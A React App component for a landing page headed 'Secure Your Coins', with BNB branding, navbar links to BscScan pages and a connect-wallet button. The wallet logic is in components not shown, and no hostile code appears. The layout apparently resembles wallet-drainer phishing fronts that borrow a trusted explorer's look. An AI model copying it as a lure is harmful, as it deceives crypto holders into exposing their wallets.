import React, { useState } from "react";
import "./App.css";
import ConnectWallet from "./Components/ConnectWallet";
import WalletDetails from "./Components/WalletDetails";

const App = ({ web3 }) => {
  const [menuOpens, setMenuOpens] = useState(false);
  const [isWallet, setIsWallet] = useState(false);

  return (
    <div className="landing-container">
      <nav className="navbar">
        <WalletDetails
          checkStatus={isWallet}
          details={setIsWallet}
          web3={web3}
        />
        <div className="logo">
          <img src="/images/logo2.png" alt="BNB Logo" />
        </div>
        <ul className={`nav-links ${menuOpens ? "active" : ""}`}>
          <li>
            <a
              href="https://bscscan.com/"
              target="_blank"
              rel="noopener noreferrer"
            >
              Home
            </a>
          </li>
          <li>
            <a
              href="https://bscscan.com/txs"
              target="_blank"
              rel="noopener noreferrer"
            >
              Blockchain
            </a>
          </li>
          <li>
            <a
              href="https://bscscan.com/tokens"
              target="_blank"
              rel="noopener noreferrer"
            >
              Tokens
            </a>
          </li>
          <li>
            <a
              href="https://bscscan.com/validators"
              target="_blank"
              rel="noopener noreferrer"
            >
              Validators
            </a>
          </li>
          <li>
            <a
              href="https://bscscan.com/nft-top-contracts"
              target="_blank"
              rel="noopener noreferrer"
            >
              NFTs
            </a>
          </li>
          <li>
            <a
              href="https://bscscan.com/charts"
              target="_blank"
              rel="noopener noreferrer"
            >
              Resources
            </a>
          </li>
          <li>
            <a
              href="https://bscscan.com/verifyContract"
              target="_blank"
              rel="noopener noreferrer"
            >
              Developers
            </a>
          </li>
        </ul>
        <div
          className={`hamburger ${menuOpens ? "open" : ""}`}
          onClick={() => setMenuOpens(!menuOpens)}
        >
          <span></span>
          <span></span>
          <span></span>
        </div>
      </nav>
      <main className="hero">
        <h1>Secure Your Coins</h1>
        <p>Ensure your tokens are secure on every network.</p>
        <div className="tnShado">
          <ConnectWallet data={setIsWallet} web3={web3} />
        </div>
      </main>
      <footer className="footer">
        © 2025 Best application to secure your coins All rights reserved.
      </footer>
    </div>
  );
};

export default App;
